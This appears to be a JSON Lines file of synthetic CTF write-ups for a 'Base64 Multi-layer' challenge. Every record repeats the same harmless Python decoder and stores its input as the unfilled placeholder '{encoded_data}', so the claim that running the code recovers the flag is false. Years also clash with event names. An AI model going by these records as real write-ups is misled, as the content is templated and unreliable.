{"id": "synthetic_encoding_067", "team": "synthetic_team_5", "event": "CTF_2024_Event_3", "challenge_name": "Base64 Multi-layer #68", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/67", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837358", "synthetic": true}
{"id": "synthetic_encoding_068", "team": "synthetic_team_2", "event": "CTF_2024_Event_17", "challenge_name": "Base64 Multi-layer #69", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/68", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837369", "synthetic": true}
{"id": "synthetic_encoding_069", "team": "synthetic_team_10", "event": "CTF_2024_Event_10", "challenge_name": "Base64 Multi-layer #70", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/69", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837381", "synthetic": true}
{"id": "synthetic_encoding_070", "team": "synthetic_team_4", "event": "CTF_2024_Event_8", "challenge_name": "Base64 Multi-layer #71", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/70", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837393", "synthetic": true}
{"id": "synthetic_encoding_071", "team": "synthetic_team_6", "event": "CTF_2024_Event_10", "challenge_name": "Base64 Multi-layer #72", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/71", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837404", "synthetic": true}
{"id": "synthetic_encoding_072", "team": "synthetic_team_3", "event": "CTF_2024_Event_3", "challenge_name": "Base64 Multi-layer #73", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/72", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837416", "synthetic": true}
{"id": "synthetic_encoding_073", "team": "synthetic_team_4", "event": "CTF_2024_Event_15", "challenge_name": "Base64 Multi-layer #74", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/73", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837430", "synthetic": true}
{"id": "synthetic_encoding_074", "team": "synthetic_team_7", "event": "CTF_2024_Event_17", "challenge_name": "Base64 Multi-layer #75", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/74", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837442", "synthetic": true}
{"id": "synthetic_encoding_075", "team": "synthetic_team_8", "event": "CTF_2024_Event_4", "challenge_name": "Base64 Multi-layer #76", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/75", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837453", "synthetic": true}
{"id": "synthetic_encoding_076", "team": "synthetic_team_1", "event": "CTF_2024_Event_7", "challenge_name": "Base64 Multi-layer #77", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/76", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837467", "synthetic": true}
{"id": "synthetic_encoding_077", "team": "synthetic_team_3", "event": "CTF_2024_Event_13", "challenge_name": "Base64 Multi-layer #78", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/77", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837478", "synthetic": true}
{"id": "synthetic_encoding_078", "team": "synthetic_team_6", "event": "CTF_2024_Event_6", "challenge_name": "Base64 Multi-layer #79", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/78", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837490", "synthetic": true}
{"id": "synthetic_encoding_079", "team": "synthetic_team_4", "event": "CTF_2024_Event_1", "challenge_name": "Base64 Multi-layer #80", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/79", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837501", "synthetic": true}
{"id": "synthetic_encoding_080", "team": "synthetic_team_5", "event": "CTF_2024_Event_20", "challenge_name": "Base64 Multi-layer #81", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n\n```\n\n## Tools Used\n- base64\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = decode_base64_recursive(encoded)\nprint(f\"Final result: {flag}\")\n", "url": "https://synthetic-ctf.example.com/encoding/80", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.837513", "synthetic": true}
{"id": "synthetic_encoding_081", "team": "synthetic_team_8", "event": "CTF_2024_Event_10", "challenge_name": "Base64 Multi-layer #82", "challenge_description": "Multiple layers of Base64 encoding", "attack_type": "Encoding", "tools_used": ["base64"], "difficulty": "easy", "writeup": "# Base64 Multi-layer\n\n## Challenge Description\nMultiple layers of Base64 encoding\n\n## Analysis\nThis challenge involves base64 multi-layer techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport base64\n\ndef decode_base64_recursive(data, max_depth=10):\n    current = data\n    \n    for depth in range(max_depth):\n        try:\n            decoded = base64.b64decode(current).decode('utf-8')\n            print(f\"Layer {depth + 1}: {decoded}\")\n            \n            if 'flag{' in decoded.lower():\n                return decoded\n            \n            # Check if still looks like base64\n            if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in decoded.strip()):\n                current = decoded.strip()\n            else:\n                return decoded\n        except:\n            break\n    \n    return current\n\nencoded = \"{encoded_data}\"\nflag = 